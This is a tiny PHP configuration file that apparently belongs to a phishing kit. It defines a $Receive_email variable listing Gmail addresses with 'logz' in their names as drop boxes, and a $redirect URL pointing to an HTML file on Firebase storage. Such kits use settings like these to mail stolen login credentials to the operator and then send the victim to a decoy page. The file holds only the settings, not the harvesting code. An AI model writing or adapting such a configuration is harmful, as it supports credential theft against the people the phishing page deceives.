<?php 
$Receive_email="donotspamus.raccslogz02@gmail.com, raccslogz02@gmail.com, raccslogz02@gmail.com, raccslogz02@gmail.com";
$redirect="https://firebasestorage.googleapis.com/v0/b/domains-5c9cd.appspot.com/o/command.htm?alt=media&token=ae6cf47b-90d3-4136-9eab-a5d3078ffd8d";
?>